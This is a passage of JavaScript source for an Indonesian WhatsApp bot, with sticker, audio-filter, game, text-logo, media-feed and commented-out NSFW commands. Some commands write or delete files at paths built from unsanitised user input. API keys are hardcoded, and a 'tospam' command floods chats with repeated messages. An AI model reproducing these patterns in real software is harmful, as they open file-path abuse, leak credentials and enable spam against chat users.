									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
						case 'takestick':
					case 'take':
              if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await zero.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							zero.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: ftrol})
							fs.unlinkSync(media)
							fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
						})
						break
						case 'dadu':
      random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			zero.sendMessage(from, damdu, sticker, {quoted: ftrol})
			break
			case 'tomp3':
              zero.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply Video Nya Kak')
					reply(mess.wait)
					encmediad = JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await zero.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						zero.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: ftrol })
						fs.unlinkSync(ran)
					})
					break
					case 'tomp4':
              if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(mess.wait)
            if ((isMedia && !zer.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
            owgi = await zero.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
            case 'robot':
              encmedial = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await zero.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
zero.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: ftrol})
fs.unlinkSync(ran)
})
break
case 'balik':
              encmediau = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await zero.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
zero.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:ftrol})
fs.unlinkSync(ran)
	})
break
case 'bass':                 
              encmediao = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await zero.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zero.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:ftrol})
						fs.unlinkSync(ran)
					})
				break
				case 'gemuk':
              encmediaz = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await zero.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					zero.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:ftrol})
						fs.unlinkSync(ran)
					})
					break
					case 'detikvn':
              encmediam = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await zero.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						zero.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:ftrol})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
            encmedian = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await zero.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						zero.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: ftrol})
						fs.unlinkSync(median)
				break
			case 'listimage':
              teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
					zero.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": imagi } })
					break
					case 'stickerlist':
				case 'liststicker':
              teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					zero.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": setik } })
					break
					case 'vnlist':
				case 'listvn':
              teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					zero.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": vien } })
					break
					case 'addsticker':
				if (!isQuotedSticker) return reply('Reply stiker')
					nm = body.slice(12)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zero.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./sticker/${nm}.webp`, delb)
					fs.writeFileSync('./storage/setik.json', JSON.stringify(setik))
					zero.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: ftrol })
					break
					case 'delsticker':
				if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./sticker/${nmm}.webp`)
					 reply(`Sukses menghapus sticker ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'addvn':
					if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zero.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./vn/${nm}.mp3`, delb)
					fs.writeFileSync('./storage/vien.json', JSON.stringify(vien))
					zero.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: ftrol })
					break
					case 'delvn':
					if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'addimage':
				if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					if (!isQuotedImage) return reply('Reply image')
					nm = body.slice(10)
					if (!nm) return reply('Nama image nya apa?')
					boij = JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zero.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/${nm}.jpg`, delb)
					fs.writeFileSync('./storage/imagi.json', JSON.stringify(imagi))
					zero.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: ftrol })
					break
					case 'delimage':
				if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/${nmm}.jpg`)
					 reply(`Sukses menghapus image ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'rate':
  rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					zero.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: ftrol })
					break
					case 'kapankah':
  kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					zero.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: ftrol })
					break
					case 'apakah':
 apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Tanyakan Ayam']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					zero.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: ftrol })
					break
					case 'bisakah':
  bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					zero.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: ftrol })
					break
					case 'caripesan':
if (args.length < 1) return reply(`Penggunaan ${prefix}caripesan Hi|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('maksimal 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await zero.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
zero.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(mess.error.api)
}
} else {
reply(`Penggunaan ${prefix}caripesan Hi|15`)
}
break
 case 'slot':
            case 'slots':
                const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            zero.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: ftrol })
            break
            case 'suit':
                if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
case 's&k':
rules = `*「 PERATURAN BOT 」*

1. DILARANG TELFON BOT!!
2. DILARANG SPAM BOT
3. DILARANG BERKATA KASAR
4. DILARANG SPAM VIRTEX
5. DILARANG TELEFON OWNER
6. DILARANG SPAM GROUP
7. DILARANG SPAM ADMIN
8. DILARANG BERKATA KASAR DI GC

⚠️JIKA KALIAN MELANGGAR.. AKAN DI BLOCK + BANNED!!`
var ZeroYT7 = {
            contextInfo: {
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            isForwarded: true,
            forwardingScore: 8,
           quotedMessage: {
           imageMessage: {
           caption: `©CREATED BY BAMBANG TRI RAHARJO`,
           jpegThumbnail: fakethumb,
           mimetype: 'image/jpeg',
           }
           }
           }
           } 
           zero.sendMessage(from, rules, MessageType.text, ZeroYT7)
           break 
case 'tag':
              if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					zero.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
          var nomqm = zer.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					zero.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
					case 'readmore':
			    	case 'more':
              const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!q.includes('|')) return  reply(mess.error.api)
                    const text1 = q.substring(0, q.indexOf('|') - 0)
                    const text2 = q.substring(q.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                 case 'pantun':
              anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${apikey7}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'tospam':
              if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  zero.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = zer.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  zero.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await zero.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  zero.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await zero.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  zero.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo : zer
	delb = await zero.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  zero.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
case 'meme':
sticWait(from)
anu = await getBuffer(`https://leyscoders-api.herokuapp.com/api/memeindo?apikey=IkyOgiwara`)
zero.sendMessage(from, anu, image, { quoted: zer, caption: 'Jangan Lupa Bahagia' })
break
case 'anjing':
anu = await getBuffer(`https://leyscoders-api.herokuapp.com/api/anjing?apikey=IkyOgiwara`)
zero.sendMessage(from, anu, image, { quoted: zer, caption: 'By Bambang Ganteng' })
break
case 'darkjoke':
anu = await getBuffer(`https://leyscoders-api.herokuapp.com/api/darkjoke?apikey=IkyOgiwara`)
zero.sendMessage(from, anu, image, { quoted: zer, caption: 'By Bambang Ganteng' })
break
case 'nekonime':
anu = await getBuffer(`https://leyscoders-api.herokuapp.com/api/nekonime?apikey=IkyOgiwara`)
zero.sendMessage(from, anu, image, { quoted: zer, caption: 'By Bambang Ganteng' })
break

case 'nickepep':
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/nick-epep?apikey=IkyOgiwara`)
reply(`*Random Nick EpEp*\n${anu.result}`)
break
case 'katailham':
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/katailham?apikey=IkyOgiwara`)
reply(`*Random Kata Ilham*\n${anu.result}`)
break
case 'katasindiran':
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/skak?apikey=IkyOgiwara`)
reply(`*Random Kata Sindiran*\n${anu.result}`)
break
case 'iklan':
hh = fs.readFileSync('./vn/iklan.mp3')
await zero.sendMessage(from, hh, MessageType.audio, {qouted: zer, mimetype: 'audio/mp4', ptt:true})
break
	case 'luxurygold':
case 'watercolor':
case 'multicolor3d':
case 'wetglass':
case 'galaxywallpaper':
case 'lighttext':
case 'beautifulflower':
case 'puppycute':
case 'royaltext':
case 'heartshaped':
case 'birthdaycake':
case 'galaxystyle':
case 'hologram3d':
case 'greenneon':
case 'glossychrome':
case 'greenbush':
case 'metallogo':
case 'noeltext':
case 'glittergold':
case 'textcake':
case 'starsnight':
case 'wooden3d':
case 'textbyname':
case 'writegalaxy':
case 'snow3d':
case 'birthdayday':
case 'goldplaybutton':
case 'silverplaybutton':
case 'freefire':
case 'cartoongravity':
case 'anonymhacker':
case 'mlwall':
case 'pubgmaskot':
case 'aovwall':
case 'logogaming':
case 'fpslogo':
case 'avatarlolnew':
case 'lolbanner':
case 'avatardota':
case 'juventusshirt':
case 'cutegravity':
case 'realvintage':
case 'codwarzone':
case 'valorantbanner':
if(args.length == 0) return reply(`Teks Nya Mana ?\nContoh : ${prefix + command} Bambang Official`)
const box = args.join(" ")
reply(mess.wait)
anu = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey1}&text=${box}`)
zero.sendMessage(from, anu, image, {quoted: ftrol, caption: 'Done Jangan Lupa Subscribe Bambang Official' })

break
case 'hartatahta':
case 'naruto':
case 'bneon':
case 'matrix':
case 'breakwall':
case 'gneon':
case 'dropwater':
case 'flowertext':
case 'crosslogo':
case 'silktext':
case 'flametext':
case 'glowtext':
case 'smoketext':
case 'skytext':
case 'cslogo':
case 'lithgtext':
case 'crismes':
case 'tfire':
case 'sandw':
case 'epep':
case 'text3dbox':
case 'logobp':
case 'leavest':
case 'thundertext':
case 'tlight':
case 'qrencode':
case 'barcode':
case 'nulis':
case 'text3d':
case 'gplaybutton':
case 'splaybutton':
if (args.length == 0) return reply(`Teks Nya Mana\nContoh : ${prefix + command} Bambang Official`)
const bgo = args.join(" ")
reply(mess.wait)
res = await getBuffer(`https://api.zeks.me/api/${command}?apikey=${apikey4}&text=${bgo}`)
zero.sendMessage(from, res, image, {quoted: ftrol, caption: 'Done Jangan Lupa Subscribe Bambang Official' })
break
case 'wolflogo':
case 'pubglogo':
case 'snowwrite':
case 'watercolour':
case 'logoaveng':
case 'phlogo':
case 'marvellogo':
case 'gtext':
if (args.length == 0) return reply(`Teks Nya Mana ?\nContoh : ${prefix + command} Bambang Official`)
txt1 = args[0]
txt2 = args[1]
reply(mess.wait)
wll = await getBuffer(`https://api.zeks.me/api/${command}?apikey=${apikey4}&text1=${txt1}&text2=${txt2}`)
zero.sendMessage(from, wll, image, {quoted: ftrol, caption: 'Done Jangan Lupa Subscribe Bambang Official' })
break
case 'blackpink':
case 'neon':
case 'greenneon':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'neonlight':
case 'holographic':
case 'text1917':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
if (args.length == 0) return reply(`Teks Nya Mana ?\nContoh : ${prefix + command} Bambang Official`)
const bogo = args.join(" ")
reply(mess.wait)
res = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey1}&text=${bogo}`)
zero.sendMessage(from, res, image, {quoted: ftrol, caption: 'Done Jangan Lupa Subscribe Bambang Official' })
break
case 'natureleaves':
case 'bokeh':
case 'toxic':
case 'strawberry':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'cloud':
case 'summersand':
case 'horrorblood':
case 'thunder':
case 'magma':
case 'impressiveglitch':
case 'harrypotter':
case 'foggywindow':
case 'watercolor':
case 'wonderfulgraffiti':
if (args.length == 0) return reply(`Teks Nya Mana\nContoh : ${prefix + command} Bambang Official`)
const bgoo = args.join(" ")
reply(mess.wait)
res = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey1}&text=${bgoo}`)
zero.sendMessage(from, res, image, {quoted: ftrol, caption: 'Done Jangan Lupa Subscribe Bambang Official' })
break
case 'ssweb':
if (args.length == 0) return reply(`Teks Nya Mana ?\nContoh: ${prefix + command} Bambang Official`)
ini_url = args.join(" ")
reply(mess.wait)
getBuffer(`https://ziy.herokuapp.com/api/ssweb?apikey=xZiyy&url=${ini_url}`).then((hasil) => {
zero.sendMessage(from, hasil, image, { thumbnail: Buffer.alloc(0), caption: `Done Jangan Lupa Subscribe Bambang Official`, quoted : ftrol})
})
break
case 'asupan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupancecan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanhijaber':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupansantuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanukhti':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanbocil':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanghea':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'asupanrika':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${apikey5}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zero.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'vietnam':
case 'korea':
case 'china':
case 'indonesia':
case 'malaysia':
case 'japan':
case 'thailand':
reply(mess.wait)
ini_result = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/${command}?apikey=${apikey5}`)
get_result = ini_result.result
ini_img = await getBuffer(get_result.url)
zero.sendMessage(from, ini_img, image, {quoted:ftrol})
break/*
case 'yuri':
if (!isGroup) return reply('this feature is only for groups')
  if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
kon = await getBuffer(`https://percobaan-apic.herokuapp.com/api/nsfw/yuri?&apikey=${hardi}`)
btr = kon.hasil
reply(btr)
//buttons = [{buttonId: `yuri`,buttonText:{displayText: `➡️Next`},type:1}]
break
case 'ass':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
aku = await getBuffer(`https://percobaan-apic.herokuapp.com/api/nsfw/ass?&apikey=${hardi}`)
buttons = [{buttonId: `ass`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(aku, "imageMessage", { thumbnail: aku, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              zero.relayWAMessage(prep)
break
case 'lesbian':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
kau = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=${hardi}`)
buttons = [{buttonId: `lesbian`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(kau, "imageMessage", { thumbnail: kau, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              zero.relayWAMessage(prep)
break
case 'eroneko':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=${hardi}`)
buttons = [{buttonId: `eroneko`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
